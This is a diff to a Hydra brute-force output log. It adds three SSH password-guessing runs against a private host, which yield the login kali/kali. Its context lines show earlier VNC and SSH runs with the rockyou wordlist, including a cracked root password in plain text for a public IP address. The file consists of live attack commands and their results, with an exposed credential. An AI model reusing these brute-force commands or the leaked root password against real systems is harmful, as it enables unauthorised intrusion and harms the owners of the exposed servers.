@@ -9,3 +9,7 @@
 # Hydra v9.4 run at 2023-03-22 08:44:10 on 192.168.1.80 vnc (hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://192.168.1.80)
 # Hydra v9.4 run at 2023-03-31 11:26:36 on 170.187.156.229 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.txt -I ssh://170.187.156.229)
 [22][ssh] host: 170.187.156.229   login: root   password: Cmonster2006!@#!@#!@#
+# Hydra v9.4 run at 2023-04-05 13:18:56 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.91)
+# Hydra v9.4 run at 2023-04-05 13:21:20 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.91)
+# Hydra v9.4 run at 2023-04-05 13:22:46 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.txt -I ssh://192.168.1.91)
+[22][ssh] host: 192.168.1.91   login: kali   password: kali
